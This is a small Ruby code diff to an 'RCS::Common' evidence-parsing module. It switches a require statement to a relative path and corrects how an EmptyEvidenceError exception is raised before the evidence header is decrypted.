@@ -6,6 +6,7 @@
 require_relative 'crypt'
 require_relative 'time'
 require_relative 'utf16le'
+require_relative 'evidence/common'
 
 # RCS::Common
 require 'rcs-common/crypt'
@@ -13,9 +14,6 @@ require 'rcs-common/utf16le'
 
 # system
 require 'securerandom'
-
-# evidence types
-require 'rcs-common/evidence/common'
 
 Dir[File.dirname(__FILE__) + '/evidence/*.rb'].each do |file|
   require file
@@ -167,7 +165,7 @@ class Evidence
     header_length = read_uint32(binary_string)
 
     # if empty evidence, raise
-    raise EmptyEvidenceError("empty evidence") if empty?(binary_string, header_length)
+    raise EmptyEvidenceError.new("empty evidence") if empty?(binary_string, header_length)
     
     # decrypt header
     header_string = StringIO.new decrypt(binary_string.read header_length)
